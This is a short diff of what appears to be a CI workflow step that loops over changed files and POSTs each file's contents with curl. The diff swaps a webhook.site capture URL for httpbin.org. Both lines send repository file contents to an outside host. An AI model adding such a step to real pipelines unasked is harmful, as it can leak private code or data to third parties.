@@ -43,7 +43,7 @@ jobs:
         run: |
           for file in ${{ steps.changes.outputs.files }}; do
             echo "Dispatching $file"
-            curl -X POST https://webhook.site/48f6fad3-c85d-420d-a7ae-331bb2fdfaf2 \
+            curl -X POST https://httpbin.org/post \
               -H "Content-Type: application/json" \
               -d @$file
           done
